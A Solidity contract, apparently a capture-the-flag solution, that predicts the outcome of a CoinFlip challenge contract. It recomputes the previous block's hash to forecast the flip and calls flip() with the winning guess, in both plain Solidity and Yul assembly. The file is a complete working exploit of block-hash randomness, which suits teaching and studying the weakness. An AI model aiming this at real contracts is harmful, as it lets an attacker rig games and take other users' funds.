// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool) external returns (bool);
}

contract CoinFlipHack {
    CoinFlip public coinflip; 
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968; 

    constructor(address chal) {
        coinflip = CoinFlip(chal);
    }

    function SolidityBuild() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = blockValue / FACTOR == 1 ? true : false;

        coinflip.flip(guess);
    }

    function YulBuild() public {
        assembly {
            mstore(0, sub(number(), 1))
            mstore(0, blockhash(mload(0)))
            let guess := div(mload(0), sload(1))

            mstore(0, "flip(bool)")
            mstore(0, keccak256(0, 10))
            mstore(4, guess)

            let success := call(gas(), sload(0), 0, 0, 0x24, 0, 0x20)

            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
